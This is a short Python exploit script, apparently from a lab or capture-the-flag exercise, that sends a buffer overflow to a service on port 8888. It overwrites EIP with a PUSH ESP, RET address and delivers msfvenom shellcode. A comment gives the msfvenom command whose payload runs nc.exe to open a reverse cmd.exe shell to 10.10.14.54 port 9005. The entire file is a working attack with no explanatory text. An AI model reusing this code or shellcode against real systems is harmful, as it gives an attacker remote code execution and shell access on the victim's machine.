import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -p windows/exec CMD='C:\users\shaun\downloads\nc.exe -e cmd.exe 10.10.14.54 9005' -b '\x00\x0A\x0D' -f python -v payload

payload =  b""
payload += b"\xba\x89\xa3\x42\x15\xdb\xc6\xd9\x74\x24\xf4\x58"
payload += b"\x33\xc9\xb1\x3e\x83\xc0\x04\x31\x50\x0e\x03\xd9"
payload += b"\xad\xa0\xe0\x25\x59\xa6\x0b\xd5\x9a\xc7\x82\x30"
payload += b"\xab\xc7\xf1\x31\x9c\xf7\x72\x17\x11\x73\xd6\x83"
payload += b"\xa2\xf1\xff\xa4\x03\xbf\xd9\x8b\x94\xec\x1a\x8a"
payload += b"\x16\xef\x4e\x6c\x26\x20\x83\x6d\x6f\x5d\x6e\x3f"
payload += b"\x38\x29\xdd\xaf\x4d\x67\xde\x44\x1d\x69\x66\xb9"
payload += b"\xd6\x88\x47\x6c\x6c\xd3\x47\x8f\xa1\x6f\xce\x97"
payload += b"\xa6\x4a\x98\x2c\x1c\x20\x1b\xe4\x6c\xc9\xb0\xc9"
payload += b"\x40\x38\xc8\x0e\x66\xa3\xbf\x66\x94\x5e\xb8\xbd"
payload += b"\xe6\x84\x4d\x25\x40\x4e\xf5\x81\x70\x83\x60\x42"
payload += b"\x7e\x68\xe6\x0c\x63\x6f\x2b\x27\x9f\xe4\xca\xe7"
payload += b"\x29\xbe\xe8\x23\x71\x64\x90\x72\xdf\xcb\xad\x64"
payload += b"\x80\xb4\x0b\xef\x2d\xa0\x21\xb2\x3b\x37\xb7\xc9"
payload += b"\x0e\x37\xc7\xd1\x3e\x50\xf6\x5a\xd1\x27\x07\x89"
payload += b"\x95\xd8\x4d\x93\xbc\x70\x08\x46\xfd\x1c\xab\xbd"
payload += b"\xc2\x18\x28\x37\xbb\xde\x30\x32\xbe\x9b\xf6\xaf"
payload += b"\xb2\xb4\x92\xcf\x61\xb4\xb6\x8c\xbf\x16\x4c\x61"
payload += b"\xa5\xd4\xdd\xd9\x56\x71\x43\x94\xf6\xdd\xe7\x39"
payload += b"\x64\xab\x8a\xa0\x04\x27\x26\x76\xb7\xa4\xe6\xe3"
payload += b"\x3f\x4e\xd7\xc6\xda\xb0\x74\x75\x41\x9f\x1f\xfd"
payload += b"\xec\xff\xee\xcd\xc0\xce\x20\x03\x2c\x05\x6f\x6e"
payload += b"\x7a\x45\x56\xa0\xb2\xb0\xa8"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
